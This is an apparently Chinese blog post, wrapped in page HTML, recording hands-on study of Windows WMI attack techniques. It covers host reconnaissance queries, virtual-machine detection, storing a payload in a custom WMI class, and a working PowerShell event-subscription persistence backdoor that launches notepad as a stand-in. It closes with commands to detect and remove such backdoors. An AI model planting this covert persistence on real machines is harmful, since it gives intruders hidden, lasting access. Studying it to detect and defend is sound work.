@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Windows-WMI分析及运用(一) | Maka8ka&#39;s Garden</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Windows-WMI分析及运用(一)" />
+<meta property="og:description" content="Windows-WMI分析及运用(一) 关键词: Windows, 持久化, 漏洞 状态: 进行中
+参考链接:
+WMI Attacks
+https://wooyun.x10sec.org/static/drops/tips-8189.html【本文由三好学生原创并首发于乌云drops】
+WMI Backdoor
+https://wooyun.x10sec.org/static/drops/tips-8260.html【本文由三好学生原创并首发于乌云drops】
+WMI Defense
+https://wooyun.js.org/drops/WMI Defense.html【本文由三好学生原创，原文地址:http://drops.wooyun.org/tips/8290】
+WMI 相关内容" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.maka8ka.cc/post/windows-wmi%E5%88%86%E6%9E%90%E5%8F%8A%E8%BF%90%E7%94%A8%E4%B8%80/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-06-29T14:55:44&#43;00:00" />
+<meta property="article:modified_time" content="2020-06-29T14:55:44&#43;00:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Windows-WMI分析及运用(一)"/>
+<meta name="twitter:description" content="Windows-WMI分析及运用(一) 关键词: Windows, 持久化, 漏洞 状态: 进行中
+参考链接:
+WMI Attacks
+https://wooyun.x10sec.org/static/drops/tips-8189.html【本文由三好学生原创并首发于乌云drops】
+WMI Backdoor
+https://wooyun.x10sec.org/static/drops/tips-8260.html【本文由三好学生原创并首发于乌云drops】
+WMI Defense
+https://wooyun.js.org/drops/WMI Defense.html【本文由三好学生原创，原文地址:http://drops.wooyun.org/tips/8290】
+WMI 相关内容"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://www.maka8ka.cc/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://www.maka8ka.cc/images/favicon.ico" />
+
+  
+  
+  
+  
+  
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RFYM27MKD6"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-RFYM27MKD6', { 'anonymize_ip': false });
+}
+</script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+    <header id="header">
+  <a href="https://www.maka8ka.cc/">
+  
+    <div id="logo" style="background-image: url(https://www.maka8ka.cc/images/logo.png)"></div>
+  
+  <div id="title">
+    <h1>Maka8ka&#39;s Garden</h1>
+  </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x" aria-hidden="true"></i></a>
+      </li>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/post/">Posts</a></li>
+      
+        <li><a href="/categories/">Categories</a></li>
+      
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+
+
+    
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <div class="content" itemprop="articleBody">
+  
+    <h1 id="windows-wmi分析及运用一">Windows-WMI分析及运用(一)</h1>
+<p>关键词: Windows, 持久化, 漏洞
+状态: 进行中</p>
+<p>参考链接:</p>
+<p>WMI Attacks</p>
+<p><a href="https://wooyun.x10sec.org/static/drops/tips-8189.html">https://wooyun.x10sec.org/static/drops/tips-8189.html</a>【本文由三好学生原创并首发于乌云drops】</p>
+<p>WMI Backdoor</p>
+<p><a href="https://wooyun.x10sec.org/static/drops/tips-8260.html">https://wooyun.x10sec.org/static/drops/tips-8260.html</a>【本文由三好学生原创并首发于乌云drops】</p>
+<p>WMI Defense</p>
+<p><a href="https://wooyun.js.org/drops/WMI%20Defense.html">https://wooyun.js.org/drops/WMI Defense.html</a>【本文由三好学生原创，原文地址:<a href="http://drops.wooyun.org/tips/8290">http://drops.wooyun.org/tips/8290</a>】</p>
+<p>WMI 相关内容</p>
+<p><a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe</a></p>
+<p>WSC、JSRAT and WMI Backdoor</p>
+<p><a href="https://wooyun.x10sec.org/static/drops/tips-15575.html">https://wooyun.x10sec.org/static/drops/tips-15575.html</a></p>
+<h2 id="0x00-前言">0x00 前言</h2>
+<pre><code>阅读千遍，不如实践一遍。本文是对三好学生原创文章WMI系列的学习及实践测试记录，仅供学习记录使用。原文链接如上。
+</code></pre>
+<h2 id="0x01-powershell实现wmi-attacks">0x01 Powershell实现WMI attacks</h2>
+<h3 id="运行环境">运行环境</h3>
+<ul>
+<li>目前环境Windows10 至少要求PowerShellV3</li>
+</ul>
+<h3 id="相关命令-信息收集">相关命令-信息收集</h3>
+<p>操作系统相关信息</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\admin&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem
+SystemDirectory <span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\system32
+Organization    <span style="color:#960050;background-color:#1e0010">:</span>
+RegisteredUser  <span style="color:#960050;background-color:#1e0010">:</span> Windows 用户
+
+PS C:\Users\admin&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
+Domain              <span style="color:#960050;background-color:#1e0010">:</span> WORKGROUP
+Manufacturer        <span style="color:#960050;background-color:#1e0010">:</span> VMware, Inc.
+Name                <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+PrimaryOwnerName    <span style="color:#960050;background-color:#1e0010">:</span> Windows 用户
+TotalPhysicalMemory <span style="color:#960050;background-color:#1e0010">:</span> 8588869632
+
+PS C:\Users\admin&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS
+Version           <span style="color:#960050;background-color:#1e0010">:</span> INTEL  - 6040000
+</code></pre></div><p>文件/目录列表</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile
+</code></pre></div><p>磁盘卷列表</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume
+
+PS C:\Users\admin&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume|findstr <span style="color:#e6db74">&#34;Caption&#34;</span>
+Caption                      <span style="color:#960050;background-color:#1e0010">:</span> C:\
+Caption                      <span style="color:#960050;background-color:#1e0010">:</span> E:\
+Caption                      <span style="color:#960050;background-color:#1e0010">:</span> \\?\Volume{6e506627-7001-4ecc-a1fb-bf533c7cae23}\
+Caption                      <span style="color:#960050;background-color:#1e0010">:</span> G:\
+</code></pre></div><p>注册表操作(未测试)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\<span style="color:#66d9ef">DEFAULT</span> -Class StdRegProv
+Push-Location HKLM<span style="color:#960050;background-color:#1e0010">:</span>SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty OptionalComponents
+</code></pre></div><p>当前进程</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process
+</code></pre></div><p>列举服务</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service
+</code></pre></div><p>日志</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent
+</code></pre></div><p>登陆账户</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser
+
+__GENUS          <span style="color:#960050;background-color:#1e0010">:</span> 2
+__CLASS          <span style="color:#960050;background-color:#1e0010">:</span> Win32_LoggedOnUser
+__SUPERCLASS     <span style="color:#960050;background-color:#1e0010">:</span> CIM_Dependency
+__DYNASTY        <span style="color:#960050;background-color:#1e0010">:</span> CIM_Dependency
+__RELPATH        <span style="color:#960050;background-color:#1e0010">:</span> Win32_LoggedOnUser.Antecedent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_Account.Domain=\&#34;</span>DESKTOP-78M3Q0H\<span style="color:#e6db74">&#34;,Name=\&#34;</span>admin\<span style="color:#e6db74">&#34;&#34;</span>,Dependent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_LogonSession.LogonId=\&#34;</span>183715\<span style="color:#e6db74">&#34;&#34;</span>
+__PROPERTY_COUNT <span style="color:#960050;background-color:#1e0010">:</span> 2
+__DERIVATION     <span style="color:#960050;background-color:#1e0010">:</span> {CIM_Dependency}
+__SERVER         <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+__NAMESPACE      <span style="color:#960050;background-color:#1e0010">:</span> ROOT\CIMV2
+__PATH           <span style="color:#960050;background-color:#1e0010">:</span> \\DESKTOP-78M3Q0H\ROOT\CIMV2<span style="color:#960050;background-color:#1e0010">:</span>Win32_LoggedOnUser.Antecedent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_Account.Domain=\&#34;</span>DESKTOP-78M3Q0H\<span style="color:#e6db74">&#34;,Name=\&#34;</span>admin\<span style="color:#e6db74">&#34;&#34;</span>,Dependent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_LogonSession.LogonId=\&#34;</span>183715\<span style="color:#e6db74">&#34;&#34;</span>
+Antecedent       <span style="color:#960050;background-color:#1e0010">:</span> \\.\root\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_Account.Domain=<span style="color:#e6db74">&#34;DESKTOP-78M3Q0H&#34;</span>,Name=<span style="color:#e6db74">&#34;admin&#34;</span>
+Dependent        <span style="color:#960050;background-color:#1e0010">:</span> \\.\root\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_LogonSession.LogonId=<span style="color:#e6db74">&#34;183715&#34;</span>
+PSComputerName   <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+
+__GENUS          <span style="color:#960050;background-color:#1e0010">:</span> 2
+__CLASS          <span style="color:#960050;background-color:#1e0010">:</span> Win32_LoggedOnUser
+__SUPERCLASS     <span style="color:#960050;background-color:#1e0010">:</span> CIM_Dependency
+__DYNASTY        <span style="color:#960050;background-color:#1e0010">:</span> CIM_Dependency
+__RELPATH        <span style="color:#960050;background-color:#1e0010">:</span> Win32_LoggedOnUser.Antecedent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_Account.Domain=\&#34;</span>DESKTOP-78M3Q0H\<span style="color:#e6db74">&#34;,Name=\&#34;</span>admin\<span style="color:#e6db74">&#34;&#34;</span>,Dependent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_LogonSession.LogonId=\&#34;</span>183625\<span style="color:#e6db74">&#34;&#34;</span>
+__PROPERTY_COUNT <span style="color:#960050;background-color:#1e0010">:</span> 2
+__DERIVATION     <span style="color:#960050;background-color:#1e0010">:</span> {CIM_Dependency}
+__SERVER         <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+__NAMESPACE      <span style="color:#960050;background-color:#1e0010">:</span> ROOT\CIMV2
+__PATH           <span style="color:#960050;background-color:#1e0010">:</span> \\DESKTOP-78M3Q0H\ROOT\CIMV2<span style="color:#960050;background-color:#1e0010">:</span>Win32_LoggedOnUser.Antecedent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_Account.Domain=\&#34;</span>DESKTOP-78M3Q0H\<span style="color:#e6db74">&#34;,Name=\&#34;</span>admin\<span style="color:#e6db74">&#34;&#34;</span>,Dependent=<span style="color:#e6db74">&#34;\\\\.\\root\\cimv2:Win32_LogonSession.LogonId=\&#34;</span>183625\<span style="color:#e6db74">&#34;&#34;</span>
+Antecedent       <span style="color:#960050;background-color:#1e0010">:</span> \\.\root\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_Account.Domain=<span style="color:#e6db74">&#34;DESKTOP-78M3Q0H&#34;</span>,Name=<span style="color:#e6db74">&#34;admin&#34;</span>
+Dependent        <span style="color:#960050;background-color:#1e0010">:</span> \\.\root\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_LogonSession.LogonId=<span style="color:#e6db74">&#34;183625&#34;</span>
+PSComputerName   <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+</code></pre></div><p>共享</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Name   Path       Description
+----   ----       -----------
+ADMIN$ C:\Windows 远程管理
+C$     C:\        默认共享
+E$     E:\        默认共享
+IPC$              远程 IPC
+</code></pre></div><p>补丁</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&gt; Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering
+
+Source        Description      HotFixID      InstalledBy          InstalledOn
+------        -----------      --------      -----------          -----------
+DESKTOP-78... Security Update  KB4570334                          2020/9/27 0<span style="color:#960050;background-color:#1e0010">:</span>00<span style="color:#960050;background-color:#1e0010">:</span>00
+DESKTOP-78... Security Update  KB4577266                          2020/9/27 0<span style="color:#960050;background-color:#1e0010">:</span>00<span style="color:#960050;background-color:#1e0010">:</span>00
+</code></pre></div><p>杀毒软件</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&gt;  Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
+
+__GENUS                  <span style="color:#960050;background-color:#1e0010">:</span> 2
+__CLASS                  <span style="color:#960050;background-color:#1e0010">:</span> AntiVirusProduct
+__SUPERCLASS             <span style="color:#960050;background-color:#1e0010">:</span>
+__DYNASTY                <span style="color:#960050;background-color:#1e0010">:</span> AntiVirusProduct
+__RELPATH                <span style="color:#960050;background-color:#1e0010">:</span> AntiVirusProduct.instanceGuid=<span style="color:#e6db74">&#34;{D68DDC3A-831F-4fae-9E44-DA132C1ACF46}&#34;</span>
+__PROPERTY_COUNT         <span style="color:#960050;background-color:#1e0010">:</span> 6
+__DERIVATION             <span style="color:#960050;background-color:#1e0010">:</span> {}
+__SERVER                 <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+__NAMESPACE              <span style="color:#960050;background-color:#1e0010">:</span> ROOT\SecurityCenter2
+__PATH                   <span style="color:#960050;background-color:#1e0010">:</span> \\DESKTOP-78M3Q0H\ROOT\SecurityCenter2<span style="color:#960050;background-color:#1e0010">:</span>AntiVirusProduct.instanceGuid=<span style="color:#e6db74">&#34;{D68DDC3A-831F-4fae-9E44-DA132C1ACF46}&#34;</span>
+displayName              <span style="color:#960050;background-color:#1e0010">:</span> Windows Defender
+instanceGuid             <span style="color:#960050;background-color:#1e0010">:</span> {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
+pathToSignedProductExe   <span style="color:#960050;background-color:#1e0010">:</span> windowsdefender<span style="color:#960050;background-color:#1e0010">:</span>//
+pathToSignedReportingExe <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">%</span>ProgramFiles%\Windows Defender\MsMpeng.exe
+productState             <span style="color:#960050;background-color:#1e0010">:</span> 397568
+timestamp                <span style="color:#960050;background-color:#1e0010">:</span> Fri, 25 Jun 2020 01<span style="color:#960050;background-color:#1e0010">:</span>35<span style="color:#960050;background-color:#1e0010">:</span>57 GMT
+PSComputerName           <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+</code></pre></div><h3 id="相关运用-虚拟机检测">相关运用-虚拟机检测</h3>
+<p>判断物理内存和逻辑内存,似乎不准！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$VMDetected = $False
+$Arguments = @{Class = <span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>;<span style="color:#66d9ef">Filter</span> = <span style="color:#e6db74">&#39;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&#39;</span>}
+<span style="color:#66d9ef">if</span> (Get-WmiObject @Arguments) { $VMDetected = $True;<span style="color:#e6db74">&#34;In vm&#34;</span>} <span style="color:#66d9ef">else</span>{<span style="color:#e6db74">&#34;Not in vm&#34;</span>}
+</code></pre></div><p>判断虚拟机进程</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$VMwareDetected = $False
+$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter <span style="color:#e6db74">&#39;Manufacturer LIKE &#34;%VMware%&#34; OR Name LIKE &#34;%VMware%&#34;&#39;</span>
+$VMBios = Get-WmiObject Win32_BIOS -Filter <span style="color:#e6db74">&#39;SerialNumber LIKE &#34;%VMware%&#34;&#39;</span>
+$VMToolsRunning = Get-WmiObject Win32_Process -Filter <span style="color:#e6db74">&#39;Name=&#34;vmtoolsd.exe&#34;&#39;</span>
+<span style="color:#66d9ef">if</span> ($VMAdapter <span style="color:#f92672">-or</span> $VMBios <span style="color:#f92672">-or</span> $VMToolsRunning) { $VMwareDetected = $True ;<span style="color:#e6db74">&#34;in vm&#34;</span>} <span style="color:#66d9ef">else</span>{<span style="color:#e6db74">&#34;not in vm&#34;</span>}
+</code></pre></div><h3 id="相关运用-存储payload管理员权限">相关运用-存储payload【管理员权限】</h3>
+<p>存储</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$StaticClass = New-Object Management.ManagementClass(<span style="color:#e6db74">&#39;root\cimv2&#39;</span>, $null,$null)
+$StaticClass.Name = <span style="color:#e6db74">&#39;Win32_EvilClass&#39;</span>
+$StaticClass.Put()
+$StaticClass.Properties.Add(<span style="color:#e6db74">&#39;EvilProperty&#39;</span> , <span style="color:#e6db74">&#34;This is payload&#34;</span>)
+$StaticClass.Put()
+
+Path          <span style="color:#960050;background-color:#1e0010">:</span> \\DESKTOP-78M3Q0H\ROOT\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_EvilClass
+RelativePath  <span style="color:#960050;background-color:#1e0010">:</span> Win32_EvilClass
+Server        <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+NamespacePath <span style="color:#960050;background-color:#1e0010">:</span> ROOT\cimv2
+ClassName     <span style="color:#960050;background-color:#1e0010">:</span> Win32_EvilClass
+IsClass       <span style="color:#960050;background-color:#1e0010">:</span> True
+IsInstance    <span style="color:#960050;background-color:#1e0010">:</span> False
+IsSingleton   <span style="color:#960050;background-color:#1e0010">:</span> False
+</code></pre></div><p>读取</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\system32&gt; (<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_EvilClass&#39;</span>).Properties[<span style="color:#e6db74">&#39;EvilProperty&#39;</span>]
+
+Name       <span style="color:#960050;background-color:#1e0010">:</span> EvilProperty
+Value      <span style="color:#960050;background-color:#1e0010">:</span> This is payload
+Type       <span style="color:#960050;background-color:#1e0010">:</span> String
+IsLocal    <span style="color:#960050;background-color:#1e0010">:</span> True
+IsArray    <span style="color:#960050;background-color:#1e0010">:</span> False
+Origin     <span style="color:#960050;background-color:#1e0010">:</span> Win32_EvilClass
+Qualifiers <span style="color:#960050;background-color:#1e0010">:</span> {CIMTYPE}
+</code></pre></div><h3 id="相关运用-隐蔽定时启动程序管理员权限">相关运用-隐蔽定时启动程序【管理员权限】</h3>
+<p>一行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$filterName = <span style="color:#e6db74">&#39;BotFilter82&#39;</span>;$consumerName = <span style="color:#e6db74">&#39;BotConsumer23&#39;</span>;$exePath = <span style="color:#e6db74">&#39;C:\Windows\System32\notepad.exe&#39;</span>;$Query = <span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34;</span>;$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$filterName;EventNameSpace=<span style="color:#e6db74">&#34;root\cimv2&#34;</span>;QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>;Query=$Query}-ErrorAction Stop;$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath};Set-WmiInstance -Class __FilterToConsumerBinding -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{<span style="color:#66d9ef">Filter</span>=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre></div><p>多行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$filterName = <span style="color:#e6db74">&#39;BotFilter82&#39;</span>
+$consumerName = <span style="color:#e6db74">&#39;BotConsumer23&#39;</span>
+$exePath = <span style="color:#e6db74">&#39;C:\Windows\System32\notepad.exe&#39;</span>
+$Query = <span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34;</span>
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$filterName;EventNameSpace=<span style="color:#e6db74">&#34;root\cimv2&#34;</span>;QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>;Query=$Query}-ErrorAction Stop
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace <span style="color:#e6db74">&#34;root\subscription&#34;</span> -Arguments @{<span style="color:#66d9ef">Filter</span>=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre></div><p>结果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">__GENUS                 <span style="color:#960050;background-color:#1e0010">:</span> 2
+__CLASS                 <span style="color:#960050;background-color:#1e0010">:</span> __FilterToConsumerBinding
+__SUPERCLASS            <span style="color:#960050;background-color:#1e0010">:</span> __IndicationRelated
+__DYNASTY               <span style="color:#960050;background-color:#1e0010">:</span> __SystemClass
+__RELPATH               <span style="color:#960050;background-color:#1e0010">:</span> __FilterToConsumerBinding.Consumer=<span style="color:#e6db74">&#34;CommandLineEventConsumer.Name=\&#34;</span>BotConsumer23\<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#66d9ef">Filter</span>=<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">                          __EventFilter.Name=\&#34;</span>BotFilter82\<span style="color:#e6db74">&#34;&#34;</span>
+__PROPERTY_COUNT        <span style="color:#960050;background-color:#1e0010">:</span> 7
+__DERIVATION            <span style="color:#960050;background-color:#1e0010">:</span> {__IndicationRelated, __SystemClass}
+__SERVER                <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q0H
+__NAMESPACE             <span style="color:#960050;background-color:#1e0010">:</span> ROOT\subscription
+__PATH                  <span style="color:#960050;background-color:#1e0010">:</span> \\DESKTOP-78M3Q0H\ROOT\subscription<span style="color:#960050;background-color:#1e0010">:</span>__FilterToConsumerBinding.Consumer=<span style="color:#e6db74">&#34;CommandLineEventConsu
+</span><span style="color:#e6db74">                          mer.Name=\&#34;</span>BotConsumer23\<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#66d9ef">Filter</span>=<span style="color:#e6db74">&#34;__EventFilter.Name=\&#34;</span>BotFilter82\<span style="color:#e6db74">&#34;&#34;</span>
+Consumer                <span style="color:#960050;background-color:#1e0010">:</span> CommandLineEventConsumer.Name=<span style="color:#e6db74">&#34;BotConsumer23&#34;</span>
+CreatorSID              <span style="color:#960050;background-color:#1e0010">:</span> {1, 5, 0, 0...}
+DeliverSynchronously    <span style="color:#960050;background-color:#1e0010">:</span> False
+DeliveryQoS             <span style="color:#960050;background-color:#1e0010">:</span>
+<span style="color:#66d9ef">Filter</span>                  <span style="color:#960050;background-color:#1e0010">:</span> __EventFilter.Name=<span style="color:#e6db74">&#34;BotFilter82&#34;</span>
+MaintainSecurityContext <span style="color:#960050;background-color:#1e0010">:</span> False
+SlowDownProviders       <span style="color:#960050;background-color:#1e0010">:</span> False
+PSComputerName          <span style="color:#960050;background-color:#1e0010">:</span> DESKTOP-78M3Q
+</code></pre></div><h3 id="相关运用-wmi后门检测及清除管理员权限">相关运用-WMI后门检测及清除【管理员权限】</h3>
+<ul>
+<li>查看当前WMI Event</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#List Event Filters</span>
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter
+
+<span style="color:#75715e">#List Event Consumers</span>
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
+
+<span style="color:#75715e">#List Event Bindings</span>
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
+</code></pre></div><ul>
+<li>清除后门</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#Filter</span>
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter <span style="color:#e6db74">&#34;Name=&#39;BotFilter82&#39;&#34;</span> | Remove-WmiObject -Verbose
+
+<span style="color:#75715e">#Consumer</span>
+Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter <span style="color:#e6db74">&#34;Name=&#39;BotConsumer23&#39;&#34;</span> | Remove-WmiObject -Verbose
+
+<span style="color:#75715e">#Binding</span>
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter <span style="color:#e6db74">&#34;__Path LIKE &#39;%BotFilter82%&#39;&#34;</span> | Remove-WmiObject -Verbose
+</code></pre></div><ul>
+<li>其他检测方法</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">–</span> vbs
+<span style="color:#960050;background-color:#1e0010">–</span> mof
+<span style="color:#960050;background-color:#1e0010">–</span> C/C++ via IWbem* COM API
+<span style="color:#960050;background-color:#1e0010">–</span> .NET System.Management classes
+查看日志
+<span style="color:#960050;background-color:#1e0010">–</span> Microsoft-Windows-WinRM/Operational
+<span style="color:#960050;background-color:#1e0010">–</span> Microsoft-Windows-WMI-Activity/Operational
+<span style="color:#960050;background-color:#1e0010">–</span> Microsoft-Windows-DistributedCOM
